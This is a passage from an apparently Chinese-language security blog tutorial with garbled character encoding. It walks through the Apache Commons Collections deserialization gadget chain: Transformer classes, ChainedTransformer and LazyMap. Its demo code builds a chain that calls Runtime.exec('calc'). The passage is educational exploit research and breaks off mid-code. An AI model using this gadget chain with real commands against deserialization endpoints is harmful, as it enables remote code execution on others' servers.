&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(constantToReturn);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//é‡å†™çš„transformæ–¹æ³•ï¼Œè·å–ä¸€ä¸ªå¯¹è±¡ç±»å‹</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getConstant</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="InvokerTransformer">InvokerTransformer</h3><p>Transformer æ¥å£çš„å®ç°ç±»ï¼Œå¹¶é‡å†™äº†å…¶æ¥å£ç±»çš„ transform æ–¹æ³•ã€‚å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯åå°„è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•å¹¶è¿”å›æ–¹æ³•è°ƒç”¨ç»“æœï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[]</span></span><br><span class="line"><span class="params">            args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//é‡å†™çš„ transform æ–¹æ³•ï¼Œåå°„è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•å¹¶è¿”å›æ–¹æ³•è°ƒç”¨ç»“æœ</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName,</span><br><span class="line">                        <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> â€¦â€¦â€¦â€¦</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demoï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ‹è¯• InvokerTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        transformer2.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###è¾“å‡º</span><br><span class="line">å¼¹å‡ºè®¡ç®—å™¨</span><br></pre></td></tr></table></figure><h3 id="InstantiateTransformer">InstantiateTransformer</h3><p>Transformer æ¥å£çš„å®ç°ç±»ï¼Œå¹¶é‡å†™äº†å…¶æ¥å£ç±»çš„ transform æ–¹æ³•ã€‚å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯åå°„è°ƒç”¨æ„é€ å‡½æ•°å°†ç±»å®ä¾‹åŒ–ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3786388740793356347L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NO_ARG_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//é‡å†™çš„ transform æ–¹æ³•ï¼Œåå°„è°ƒç”¨æ„é€ å‡½æ•°å°†ç±»å®ä¾‹åŒ–ã€‚</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Student ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å­¦ç”Ÿå§“å:&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æµ‹è¯• InstantiateTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;å°æ˜&quot;</span>&#125;);</span><br><span class="line">        instantiateTransformer.transform(Student.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">###è¾“å‡º</span><br><span class="line">å­¦ç”Ÿå§“å:å°æ˜</span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="ChainedTransformer">ChainedTransformer</h3><p>Transformer æ¥å£çš„å®ç°ç±»ï¼Œå¹¶é‡å†™äº†å…¶æ¥å£ç±»çš„ transformer æ–¹æ³•ã€‚å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯å®ç°æ•°ç»„é“¾å¼è°ƒç”¨ã€‚æˆ‘ä»¬åªéœ€ä¼ å…¥ä¸€ä¸ª Transformer[] ç»™ ChainedTransformerï¼Œç„¶åæ‰§è¡Œ ChainedTransformer çš„ transform æ–¹æ³•ä¾¿å¯ä»¥é“¾å¼è°ƒç”¨ Transformer[] ä¸­æ¯ä¸ª Transformer çš„ transform æ–¹æ³•ã€‚å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//é‡å†™çš„ transform æ–¹æ³•ï¼Œé“¾å¼è°ƒç”¨ Transformer[] ä¸­æ¯ä¸ª Transformer çš„ transform</span></span><br><span class="line">    æ–¹æ³•</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demoï¼šï¼ˆ å¾ˆé‡è¦ åˆ©ç”¨ ChainedTransformer å®ç° Runtime.<em>getRuntime</em>().exec(â€œcalcâ€) ï¼‰</p><p>è¿™ä¸ªæ˜¯åå°„è°ƒç”¨execå’Œåˆ©ç”¨Transformerè°ƒç”¨çš„å¯¹æ¯”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="comment">//Method Runtime = c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">Runtime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(c);</span><br><span class="line">        <span class="comment">//Runtime r = (Runtime) Runtime.invoke(null,null);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (java.lang.Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(Runtime);</span><br><span class="line">        <span class="comment">//Method exec = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line">        <span class="comment">//exec.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ChainedTransformerè¿›è¡Œåˆ©ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">// æµ‹è¯• ChainedTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chain.transform(<span class="string">&quot;test1111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è§¦å‘ ChainedTransformer çš„ transform æ–¹æ³•å‘¢ï¼Ÿè¿™å°±å¼•å‡ºäº† LazyMap ç±»ã€‚</p><h3 id="LazyMapï¼ˆé‡è¦ï¼‰">LazyMapï¼ˆé‡è¦ï¼‰</h3><p>å…¶ get æ–¹æ³•ä¸­å¯ä»¥è§¦å‘ ChainedTransformer çš„ transform æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line">    <span class="comment">//å¯æ§åˆ¶ factory ä¸º ChainedTransformer</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åˆ©ç”¨ get æ–¹æ³•å¯å®ç°è°ƒç”¨ ChainedTransformer#transform()</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line"><span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ‹è¯• ChainedTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//è¿™é‡Œä»€ä¹ˆmapéƒ½è¡Œï¼Œåªè¦ç±»å‹æ˜¯mapå°±è¡Œ</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(map,chain);</span><br><span class="line">        lazy.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###è¾“å‡º</span><br><span class="line">å¼¹å‡ºè®¡ç®—å™¨</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•ååºåˆ—åŒ–æ—¶è§¦å‘ L</p><h3 id="TemplatesImplï¼ˆé‡è¦ï¼‰">TemplatesImplï¼ˆé‡è¦ï¼‰</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> 